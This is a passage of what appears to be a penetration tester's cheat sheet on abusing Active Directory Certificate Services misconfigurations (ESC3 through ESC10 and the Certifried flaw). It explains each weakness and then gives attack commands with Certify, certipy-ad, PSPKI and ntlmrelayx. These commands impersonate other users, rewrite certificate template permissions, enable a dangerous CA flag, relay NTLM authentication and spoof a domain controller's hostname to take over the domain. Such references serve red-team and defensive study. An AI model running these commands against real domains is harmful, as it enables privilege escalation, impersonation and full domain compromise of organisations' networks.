<div class="highlight"><pre><span></span><code>certsrc.msc snap-in &rarr; right clicking on the &rarr; clicking Properties &rarr; navigating to the &ldquo;Enrollment Agents&rdquo; tab
</code></pre></div>
<p>Request an enrollment agent certificate (<strong>CONDITION1</strong>):</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:&lt;domain&gt;<span class="se">\&lt;</span>CA&gt;<span class="w"> </span>/template:&lt;Enrollment<span class="w"> </span>Agent<span class="w"> </span>Template<span class="w"> </span>name&gt;
</code></pre></div>
<p>Use the enrollment agent certificate to issue a certificate request on behalf of another to a template that allow for domain authentication (<strong>CONDITION2</strong>):</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>request<span class="w"> </span>/ca:&lt;domain&gt;<span class="se">\&lt;</span>CA&gt;<span class="w"> </span>/template:&lt;Vulnerable<span class="w"> </span>Template<span class="w"> </span>name<span class="w"> </span><span class="o">(</span>eg.<span class="w"> </span>User<span class="o">)</span>&gt;<span class="w"> </span>/onbehalfof:&lt;target<span class="w"> </span>user<span class="w"> </span>domain&gt;/&lt;target<span class="w"> </span>username&gt;<span class="w"> </span>/enrollcert:&lt;CONDITION1<span class="w"> </span>pfx<span class="w"> </span>certificate&gt;<span class="w"> </span>/enrollcertpw:&lt;CONDITION1<span class="w"> </span>pfx<span class="w"> </span>certificate<span class="w"> </span>password&gt;
</code></pre></div>
<p>Request a certificate (for <strong>CONDITION1</strong>) with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;ca<span class="w"> </span>server&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>ESC3-CONDITION1<span class="w"> </span>template&gt;
</code></pre></div>
<p>Request certificate on behalf of another user with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;ca<span class="w"> </span>server&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>ESC3-CONDITION2<span class="w"> </span>template&gt;<span class="w"> </span>-pfx<span class="w"> </span>&lt;CONDITION1<span class="w"> </span>.pfx<span class="w"> </span>certificate&gt;<span class="w"> </span>-on-behalf-of<span class="w"> </span><span class="s1">'&lt;domain&gt;\&lt;user to impersonate&gt;'</span>
</code></pre></div>
<h4 id="vulnerable-certificate-template-access-control-esc4">Vulnerable Certificate Template Access Control - ESC4</h4>
<p>A certificate template is misconfigured at the access control level if it has ACEs that allow unintended, or otherwise unprivileged, AD principals to edit sensitive security settings in the template.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li><strong>REQ1</strong>: a low privileged user has <strong>Full Control</strong> or <strong>Write</strong> permissions on the certificate template object.</li>
</ul>
<p><strong>The attack</strong>: edit the certificate template object to enable other attacks such as <strong>ESC1</strong>.</p>
<p>Enumerate certificate templates ACLs with <a href="https://github.com/PKISolutions/PSPKI">PSPKI</a>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-CertificateTemplateAcl</span>
</code></pre></div>
<p>Enumerate certificate templates ACLs with <code>Certify</code>:</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>find
</code></pre></div>
<p>Abuse misconfigured ACLs by making a certificate template vulnerable to other escalation techniques with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w">&nbsp;</span>-username<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>template&gt;<span class="w"> </span>-save-old
</code></pre></div>
<p><strong>Note</strong>: <code>-save-old</code> generates a .json file containing the original configuration for the target template.</p>
<p>Restore certificate to its original configuration:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>template<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>ip&gt;<span class="w">&nbsp;</span>-username<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>template&gt;<span class="w"> </span>-configuration<span class="w"> </span>&lt;original<span class="w"> </span>configuration<span class="w"> </span>.json&gt;
</code></pre></div>
<h4 id="vulnerable-pki-object-access-control-esc5">Vulnerable PKI Object Access Control - ESC5</h4>
<p><strong>Requirements:</strong></p>
<ul>
<li><strong>REQ1</strong>: a low privileged user has control on the <strong>CA server&rsquo;s AD computer object</strong> or <strong>the CA server&rsquo;s RPC/DCOM server</strong> or ny descendant AD object or container in the container <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;COMPANY&gt;,DC=&lt;COM&gt;</code> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.)</li>
</ul>
<p><strong>The attack</strong>: an attacker with these privileges can compromise the PKI system and perform any other attack on the certificate services.</p>
<h4 id="editf_attributesubjectaltname2-esc6">EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</h4>
<p><strong>Requirements</strong>:
- <strong>REQ1</strong>: If <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is set on the CA, any request can have user defined values in the subject alternative name. </p>
<p><strong>The attack</strong>: This means that an attacker can enroll in ANY template configured for domain authentication (eg. the default <strong>User</strong> template) and obtain a certificate that allows authenticating as any other user.</p>
<p><strong>Note</strong>: this attack is not working anymore since May 2022 due the patch for <strong>CVE-2022&ndash;26923</strong>.</p>
<p>Check if <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> (<strong>ESC6</strong>) is enabled:</p>
<div class="highlight"><pre><span></span><code>certutil<span class="w"> </span>-config<span class="w"> </span><span class="s2">"&lt;CA_HOST&gt;\&lt;CA_NAME&gt;"</span><span class="w"> </span>-getreg<span class="w"> </span><span class="s2">"policy\EditFlags"</span>

<span class="c1"># or with remote registry query</span>
reg.exe<span class="w"> </span>query<span class="w"> </span><span class="se">\\</span>&lt;CA_SERVER&gt;<span class="se">\H</span>KEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\C</span>ertSvc<span class="se">\C</span>onfigu
ration&lt;CA_NAME&gt;<span class="se">\P</span>olicyModules<span class="se">\C</span>ertificateAuthority_MicrosoftDefault.Policy<span class="se">\ </span>/v<span class="w"> </span>EditFlags

<span class="c1"># or with Certify</span>
Certify.exe<span class="w"> </span>find
</code></pre></div>
<p>Enable/disable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> with certutil:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Enable</span>
certutil<span class="w"> </span>-config<span class="w"> </span><span class="s2">"&lt;CA_HOST&gt;\&lt;CA_NAME&gt;"</span><span class="w"> </span>-setreg<span class="w"> </span>policy<span class="se">\E</span>ditFlags<span class="w"> </span>+EDITF_ATTRIBUTESUBJECTALTNAME2

<span class="c1"># Disable</span>
certutil<span class="w"> </span>-config<span class="w"> </span><span class="s2">"&lt;CA_HOST&gt;\&lt;CA_NAME&gt;"</span><span class="w"> </span>-setreg<span class="w"> </span>policy<span class="se">\E</span>ditFlags<span class="w"> </span>-EDITF_ATTRIBUTESUBJECTALTNAME2
</code></pre></div>
<p>Request a certificate with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;ca<span class="w"> </span>server&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>template&gt;<span class="w"> </span>-upn<span class="w"> </span>&lt;user<span class="w"> </span>to<span class="w"> </span>impersonate&gt;@&lt;domain&gt;
</code></pre></div>
<h4 id="vulnerable-certificate-authority-access-control-esc7">Vulnerable Certificate Authority Access Control - ESC7</h4>
<p><strong>Requirements</strong>:</p>
<ul>
<li><strong>REQ1</strong>: a user with <strong>ManageCA</strong> rights on the certificate authority object.<ul>
<li><code>certsrv.msc &rarr; right clicking a CA &rarr; selecting properties &rarr; switch to the Security tab</code></li>
</ul>
</li>
<li>[Optional] <strong>REQ2</strong>: a user with <strong>ManageCertificates</strong> right on the certificate authority object.<ul>
<li><code>certsrv.msc &rarr; right clicking a CA &rarr; selecting properties &rarr; switch to the Security tab</code></li>
</ul>
</li>
</ul>
<p><strong>The attack</strong>: when <strong>REQ1</strong> is satisfied, the user can enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag i.e. enable the <strong>ESC6</strong>. Moreover, when the <strong>REQ2</strong> is satisfied, the user has the ability to remotely approve pending certificate requests; this allows an attacker to <strong>subvert the "CA certificate manager approval" protection</strong>.
Moreover, a user with <code>Manage CA</code> access right, can grant itself the <code>Manage Certificates</code> access right.</p>
<p>Check if a user as <code>ManageCA</code> and <code>ManageCertificates</code> privileges from gui (<code>mmc.exe</code>)(REQ1-2):</p>
<div class="highlight"><pre><span></span><code>certsrv.msc &rarr; right clicking a CA &rarr; selecting properties &rarr; switch to the Security tab
</code></pre></div>
<p>Check if a user as <code>ManageCA</code> and <code>ManageCertificates</code> privileges with <code>PSPKI</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-CertificationAuthority</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">CA</span> <span class="n">hostname</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Get-CertificationAuthorityAcl</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-expand</span> <span class="n">Access</span>
</code></pre></div>
<p>Remotely enable <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag (bitmask <code>262144</code>) for a CA with <code>PSPKI</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Import-Module</span> <span class="n">PSPKI</span>
<span class="nv">$ConfigReader</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">SysadminsLV</span><span class="p">.</span><span class="n">PKI</span><span class="p">.</span><span class="n">Dcom</span><span class="p">.</span><span class="n">Implementations</span><span class="p">.</span><span class="n">CertSrvRegManagerD</span> <span class="s2">"&lt;CA FQDN&gt;"</span>
<span class="nv">$ConfigReader</span><span class="p">.</span><span class="n">SetRootNode</span><span class="p">(</span><span class="nv">$true</span><span class="p">)</span>
<span class="nv">$res</span> <span class="p">=</span> <span class="nv">$ConfigReader</span><span class="p">.</span><span class="n">GetConfigEntry</span><span class="p">(</span><span class="s2">"EditFlags"</span><span class="p">,</span> <span class="s2">"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"</span><span class="p">)</span>
<span class="nv">$ConfigReader</span><span class="p">.</span><span class="n">SetConfigEntry</span><span class="p">(</span><span class="nv">$res</span> <span class="p">+</span> <span class="n">262144</span><span class="p">,</span><span class="s2">"EditFlags"</span><span class="p">,</span> <span class="s2">"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"</span><span class="p">)</span>
</code></pre></div>
<p>Remotely approve certificate requests with <code>PSPKI</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-CertificationAuthority</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">CA</span> <span class="n">hostname</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Get-PendingRequest</span> <span class="n">-RequestID</span> <span class="p">&lt;</span><span class="n">request</span> <span class="n">id</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Approve-CertificateRequest</span>
</code></pre></div>
<p>Download certificate with <code>Certify</code>:</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>download<span class="w"> </span>/ca:&lt;domain&gt;<span class="se">\&lt;</span>CA&gt;<span class="w"> </span>/id:&lt;certificate<span class="w"> </span>request<span class="w"> </span>id&gt;
</code></pre></div>
<p>Add <code>Manage Certificates</code> grant to a user with <code>certipy-ad</code> (requires <code>Manage CA</code> rights):</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;target<span class="w"> </span>ca<span class="w"> </span>server&gt;<span class="w"> </span>-add-officer<span class="w"> </span>&lt;target<span class="w"> </span>username<span class="w"> </span>-<span class="w"> </span>generally<span class="w"> </span>himself&gt;<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;
</code></pre></div>
<p>Enable a template with <code>certipy-ad</code> (requires <code>Manage CA</code> rights):</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;target<span class="w"> </span>ca<span class="w"> </span>server&gt;<span class="w"> </span>-enable-template<span class="w"> </span>&lt;template<span class="w"> </span>name&gt;<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;
</code></pre></div>
<p>Approve a certificate request with <code>certipy-ad</code> (requires <code>Manage CA</code> rights):</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;target<span class="w"> </span>ca<span class="w"> </span>server&gt;<span class="w"> </span>-issue-request<span class="w"> </span>&lt;request<span class="w"> </span>id&gt;<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;
</code></pre></div>
<p>Retrieve a certificate by request id with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>ca<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;target<span class="w"> </span>ca<span class="w"> </span>server&gt;<span class="w"> </span>-retrieve<span class="w"> </span>&lt;request<span class="w"> </span>id&gt;<span class="w"> </span>-username<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;password&gt;
</code></pre></div>
<h4 id="ntlm-relay-to-ad-cs-http-endpoints-esc8">NTLM Relay to AD CS HTTP Endpoints &ndash; ESC8</h4>
<p>AD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. Using NTLM relay, an attacker could access these web interfaces and request a client authentication certificate based on the User or Machine certificate templates.</p>
<p>This is possible since these endpoints do not have any NTLM relay protections enabled:</p>
<ul>
<li>The web enrollment interface (<code>http://&lt;caserver&gt;/certsrv/</code>) supports only HTTP and allows only NTLM HTTP Authentication via <code>Authorization</code> HTTP header.</li>
<li>Even though they support negotiate authentication potentially allowing more secure authentication methods, the <strong>Certificate Enrollment Service (CES)</strong>, <strong>Certificate Enrollment Policy (CEP) Web Service</strong>, and <strong>Network Device Enrollment Service (NDES)</strong> are still vulnerable since an attacker can negotiate down to NTLM authentication. <ul>
<li>It's possible to prevent NTLM relay attacks on these by coupling HTTP with channel binding but AD CS does not enable <strong>EPA</strong>.</li>
</ul>
</li>
<li>It's possible to use common <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#coerced-authentications">Coreced Authentications</a> methods to request a certificate from a template with <strong>domain computer enrollment</strong> and <strong>client authentication</strong> such as the default <strong>Machine</strong> template to compromised <strong>any computer</strong> coerced.</li>
</ul>
<p>Enumerate enabled HTTP AD CS endpoints with <code>Certify</code>:</p>
<div class="highlight"><pre><span></span><code>Certify.exe<span class="w"> </span>cas
</code></pre></div>
<p>Enumerate CES endpoints with <code>PSPKI</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">Get-CertificationAuthority</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">Enroll</span><span class="p">*</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
</code></pre></div>
<p>Perform a relay attack with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Targeting HTTP AD CS Endpoints</span>
certipy<span class="w"> </span>relay<span class="w"> </span>-target<span class="w"> </span><span class="s1">'http://&lt;ca server&gt;'</span><span class="w"> </span>-template<span class="w"> </span>&lt;template<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>request&gt;

<span class="c1"># Targeting RDP AD CS Endpoints</span>
certipy<span class="w"> </span>relay<span class="w"> </span>-target<span class="w"> </span><span class="s1">'rpc://&lt;ca server&gt;'</span><span class="w"> </span>-template<span class="w"> </span>&lt;template<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>request&gt;
</code></pre></div>
<p><strong>Note</strong>: by default, certipy will use the <code>User</code> or <code>Machine</code> templates if <code>-template</code> is not specified; if relaying a DC machine account NTLM, use the template <code>DomainController</code>. When relaying a non-DC machine account use the <code>Machine</code> template.</p>
<p>Perform a relay attack with Impacket's <code>ntlmrelayx</code>:</p>
<div class="highlight"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span><span class="s1">'http://&lt;target ca server&gt;/certsrv/certfnsh.asp'</span><span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>&lt;template<span class="w"> </span>to<span class="w"> </span>use&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;target<span class="w"> </span>dump<span class="w"> </span>directory&gt;
</code></pre></div>
<h4 id="certificate-mapping">Certificate Mapping</h4>
<p><strong>Certificate mapping</strong> involves associating issued certificates with their respective
subjects:</p>
<ul>
<li>When a user requests a certificate, the mapping will associate the issued certificate to that specific user.</li>
</ul>
<p>Mapping a certificate to an object can be:</p>
<ul>
<li><strong>Explicit</strong>: the <code>altSecurityIdentities</code> attribute of the account must contains the identifier of the certificate. This way, for authentication the certificate must be signed by a trusted CA and match the <code>altSecurityIdentities</code> value.</li>
<li><strong>Implicit</strong>:  the information contained in the certificate's <code>SAN</code> is used to match with the DNS (<code>dnsHostName</code>) for machine accounts or the UPN (<code>userPrincipalName</code>) for user accounts.</li>
</ul>
<p>Explicit and Implicit mapping can be:</p>
<ul>
<li><strong>Weak</strong>: The mapping is based on certificate attribute without requiring a direct link in AD.</li>
<li><strong>Strong</strong>: Strong mapping enforces a strict one-to-one relationship between a certificate and an AD user account.</li>
</ul>
<p>To overcome the map issue discovered with [CVE-2022&ndash;26923 (Certifried)]]({filename}/ad/active-directory-cheatsheet.md#cve-2022-26923-certifried), Microsoft introduced a new security extension <code>szOID_NTDS_CA_SECURITY_EXT</code> for certificates:</p>
<ul>
<li>Contains the  <code>objectSid</code> of the requester</li>
</ul>
<p>Moreover, two new registry keys have been introduced to properly deal with certificate mapping:</p>
<ul>
<li><code>StrongCertificateBindingEnforcement</code>:  used for <em>Kerberos</em> mapping.</li>
<li><code>CertificateMappingMethods</code> used for <em>Schannel</em> implicit mapping.</li>
</ul>
<p><code>StrongCertificateBindingEnforcement</code> can be:</p>
<ul>
<li><code>0</code>: the  <code>szOID_NTDS_CA_SECURITY_EXT</code> extension is not checked, all explicit mappings are allowed. Since 11/04/2024, indicating <code>0</code> is now equivalent to indicating <code>1</code>.</li>
<li><code>1</code>: default after the CVE-2022-26923 patch. Authentication is allowed when explicit mapping is present. In the case of <strong>weak implicit mapping</strong>, authentication is allowed if the certificate does not contain a SID in the <code>szOID_NTDS_CA_SECURITY_EXT</code> and the account predates the certificate (i.e. the user account in AD existed before the certificate was issued). This mode is also referred as "Compatibility Mode" and it's no more supported since 11/02/2025.</li>
<li><code>2</code>: <strong>Only strong mapping is allowed</strong> for authentication. In case of implicit authentication, <code>szOID_NTDS_CA_SECURITY_EXT</code> must be present and contain a object's SID. In case of explicit mapping, only strong types are allowed.</li>
</ul>
<p>When <code>StrongCertificateBindingEnforcement</code> is <code>0</code> and the certificate contains a UPN, the map flow is the following:</p>
<ol>
<li>The KDC first attempts to map the certificate to a user with a matching <code>userPrincipalName</code>.</li>
<li>If no match are found, the KDC tries then to map the certificate to a user with a matching <code>sAMAccountName</code>.</li>
<li>If still no match, the KDC tries matching a username appending a "$". In that case, a UPN will be mapped to a machine account.</li>
</ol>
<p>When <code>StrongCertificateBindingEnforcement</code> is <code>0</code> and the certificate contains a DNS value, the map flow is the following (the same abused in Certifried):</p>
<ol>
<li>The KDC splits the username into two parts: <em>user</em> and <em>domain</em>.  <code>user.domain.local</code> becomes <code>user</code> and <code>domain.local</code>. </li>
<li>The domain part is validate against AD domain (must be a valid domain).</li>
<li>The user part is validated by adding a "$" and searching for an account with a corresponding <code>sAMAccountName</code>.</li>
</ol>
<p>If the registry key value is 1* or 2, the <code>szOID_NTDS_CA_SECURITY_EXT</code> security extension will
be used to map the account using its objectSid.</p>
<p>*Note: <code>szOID_NTDS_CA_SECURITY_EXT</code> is present and valued with a SID.</p>
<h5 id="cve-2022-26923-certifried">CVE-2022&ndash;26923 - Certifried</h5>
<p>Reference: <a href="https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained#vulnerability_description">CVE-2022-26923 - Certifried Explained</a>.</p>
<p>This vulnerability abuses AD CS to request machine certificates with arbitrary attacker-controlled DNS host names.</p>
<ul>
<li>This allows any computer account in the domain to impersonate the Domain Controller, resulting in a complete domain takeover. </li>
</ul>
<p>Since machine accounts are not associated with a <strong>UPN</strong>, the flag <code>CT_FLAG_SUBJECT_ALT_REQUIRE_UPN</code> is not applicable:</p>
<ul>
<li>The DNS host name attribute (<code>dNSHostName</code>) is used instead on Machine certificates, as indicated by the <code>CT_FLAG_SUBJECT_ALT_REQUIRE_DNS</code> flag. </li>
</ul>
<p>By default, the creator of a machine account has the <strong>Validated write to DNS host name</strong> permission on this account; this means that a user with this permission can set the <code>dNSHostName</code> to any value (any valid computer name in the domain), for example, setting the same hostname as a Domain Controller.</p>
<ul>
<li>This is true only when removing all SPNs that contains the value from <code>dNSHostName</code>; this is necessary due the fact that SPNs are validated whilst <strong>dNSHostName</strong> itself is not.</li>
</ul>
<p>When a certificate is used for authentication, PKINIT will <strong>weakly map</strong> the request to the Domain Controller account as follows, effectively resulting in authentication as the DC machine account:</p>
<ol>
<li>The principal name of the target account (e.g. computer01$@htb.local) is supplied, together with a certificate containing a matching DNS host name computer01@htb.local (without the $ sign at the end).</li>
<li>The KDC looks up the machine account from the given principal name, obtaining the corresponding <code>sAMAccountName</code> (computer01$).</li>
<li>Having obtained the target <code>sAMAccountName</code>, the KDC then splits the DNS host name from the certificate into two parts: computer name (computer01) and realm (htb.local).</li>
<li>If the computer name part (computer01) matches the <code>sAMAccountName</code> (computer01$) and the realm part (htb.local) matches the DNS domain name of the realm, mapping is successful. Otherwise, the KDC should return the KDC_ERR_CLIENT_NAME_MISMATCH error.</li>
</ol>
<p>Create a machine account with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>account<span class="w"> </span>create<span class="w"> </span>-u<span class="w"> </span>username@domain<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-user<span class="w"> </span><span class="s1">'&lt;machine account name&gt;$'</span><span class="w"> </span>-dns<span class="w"> </span>&lt;dNSHostName<span class="w"> </span>-<span class="w"> </span>target<span class="w"> </span>DC<span class="w"> </span>host<span class="w"> </span>name&gt;<span class="w"> </span><span class="o">[</span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="o">]</span>
</code></pre></div>
<p>Request a certificate for the created machine account with the <code>Machine</code> template with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>username@domain<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-ca<span class="w"> </span>&lt;CA<span class="w"> </span>Name&gt;<span class="w"> </span>-template<span class="w"> </span>Machine
</code></pre></div>
<p>Authenticate to the DC using the resulting certificate with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>dc.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;
</code></pre></div>
<p>Remove machine account (requires elevated privileges):</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>account<span class="w"> </span>delete<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-user<span class="w"> </span><span class="s1">'&lt;machine account name&gt;$'</span>
</code></pre></div>
<p>Interesting Tools:</p>
<ul>
<li><a href="https://github.com/GhostPack/PSPKIAudit">PSPKIAudit</a></li>
</ul>
<h5 id="no-security-extension-esc9">No Security Extension - ESC9</h5>
<p>When the <code>msPKI-Enrollment-Flag</code> attribute of a certificate template contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag, it effectively negates the embedding of the <code>szOID_NTDS_CA_SECURITY_EXT</code> security extension when <code>StrongCertificateBindingEnforcement</code> is not set to <code>2</code>. </p>
<ul>
<li>the mapping process will occur as if <code>StrongCertificateBindingEnforcement</code> has a value of <code>0</code>, essentially bypassing strong certificate mapping and using UPN or DNS values.</li>
</ul>
<p>Requirements:</p>
<ul>
<li><strong>REQ1</strong>: <code>StrongCertificateBindingEnforcement</code> should not be set to <code>2</code> or <code>CertificateMappingMethods</code> is set to <code>0x4</code>. This requirement cannot be checked with low-privileged users since typically it would not have enough privileges to read those registry keys.</li>
<li><strong>REQ2</strong>: the <code>msPKI-Enrollment-Flag</code> attribute of a certificate template contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag</li>
<li><strong>REQ3</strong>: the certificate template should allow client authentication.</li>
<li><strong>REQ4</strong>: <code>GenericWrite</code> (or higher) privileges are required to alter the UPN of the account that can enroll this certificate template.</li>
</ul>
<p><strong>The attack</strong>: having enough write privileges on an account that can enroll a vulnerable template, an attacker could modify its UPN and set it to the value of an Administrator UPN. Then the attacker could simply request the certificate with the modified UPN account (its credentials/hashes are therefore needed).</p>
<p>Update user UPN with <code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy<span class="w"> </span>account<span class="w"> </span>update<span class="w"> </span>-username<span class="w"> </span><span class="s2">"&lt;owned user&gt;@&lt;domain&gt;"</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>-user<span class="w"> </span>&lt;target<span class="w"> </span>user&gt;<span class="w"> </span>-upn<span class="w"> </span>&lt;Administrator<span class="w"> </span>UPN&gt;
</code></pre></div>
<p><strong>Note</strong>: Use the same command to restore the old value.</p>
<p>Request then the certificate using <em>target user</em> credentials with<code>certipy-ad</code>:</p>
<div class="highlight"><pre><span></span><code>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-ca<span class="w"> </span>&lt;ca<span class="w"> </span>name&gt;<span class="w"> </span>-target<span class="w"> </span>&lt;ca<span class="w"> </span>server&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;vulnerable<span class="w"> </span>ESC9<span class="w"> </span>template<span class="w"> </span>or<span class="w"> </span><span class="s1">'User'</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>ESC10&gt;
</code></pre></div>
<h5 id="weak-certificate-mapping-esc10">Weak certificate mapping - ESC10</h5>
<p>The ESC10 abuse case is similar to the previous ESC9 but focuses on misconfigurations in
registry keys rather than template configurations. There are two cases where this misconfiguration can be exploited.</p>
<ul>
<li><strong>CASE1 - Kerberos Authentication</strong>: <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> (no more exploitable since April 2023 patch).</li>
<li><strong>CASE2 - Schannel Authentication</strong>: <code>CertificateMappingMethods</code> is set to <code>0x4</code>.</li>
</ul>
<p><strong>CASE1</strong> Requirements:</p>
<ul>
<li><strong>REQ1</strong>: <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> </li>
<li><strong>REQ2</strong>: The template allows client authentication.</li>
<li><strong>REQ3</strong>: <code>GenericWrite</code> (or higher) privileges are required to alter the UPN of the account that can enroll this certificate template.</li>
</ul>
<p><strong>The attack</strong>: same as for <strong>ESC9</strong>.</p>
<p><strong>CASE2</strong> Requirements:</p>
<ul>
<li><strong>REQ1</strong>: <code>CertificateMappingMethods</code> is set to <code>0x4</code>.</li>
<li><strong>REQ2</strong>: The template allows client authentication.</li>
<li><strong>REQ3</strong>: <code>GenericWrite</code> (or higher) privileges are required to set the UPN of the account that can enroll this certificate template <strong>that must not have an UPN set</strong> (otherwise, constraint violation errors are raised).</li>
</ul>
<p><strong>The attack</strong>: same as for <strong>ESC9</strong>.</p>
